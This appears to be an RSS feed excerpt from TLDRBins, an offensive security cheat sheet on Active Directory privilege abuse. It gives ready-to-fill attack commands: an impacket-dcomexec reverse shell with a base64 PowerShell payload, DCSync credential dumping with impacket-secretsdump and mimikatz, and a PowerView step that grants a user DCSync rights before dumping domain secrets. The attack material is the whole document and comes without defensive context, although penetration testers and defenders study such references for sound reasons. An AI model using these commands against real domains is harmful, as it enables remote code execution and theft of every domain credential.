channel.title: Dcsync on TLDRBins
channel.description: Recent content in Dcsync on TLDRBins

item.title: ExecuteDCOM
item.description: Abuse #1: ExecuteDCOM (From Linux) # Revshell impacket-dcomexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET> '<powershell #3 Base64>' -silentcommand -object MMC20

item.title: GetChanges/GetChangesAll
item.description: Abuse #1: DCSync Attack (From Linux) # With creds impacket-secretsdump -just-dc <USER>:<PASSWORD>@<TARGET> # With hashes impacket-secretsdump -hashes <LM>:<NT> -just-dc <DOMAIN>/<USER>@<TARGET> Abuse #1: DCSync Attack (From Windows) .\mimikatz.exe 'lsadump::dcsync /domain:<DOMAIN> /user:administrator' exit

item.title: WriteDacl
item.description: Abuse #1: Add dcsync right to user 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = "<DOMAIN>\<USER>" $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Add dcsync right Add-DomainObjectAcl -PrincipalIdentity <USER> -TargetIdentity '<DOMAIN>\<TARGET_GROUP>' -Rights DCSync -Credential $cred 4. Secrets dump impacket-secretsdump <USER>:<PASSWORD>@<TARGET>
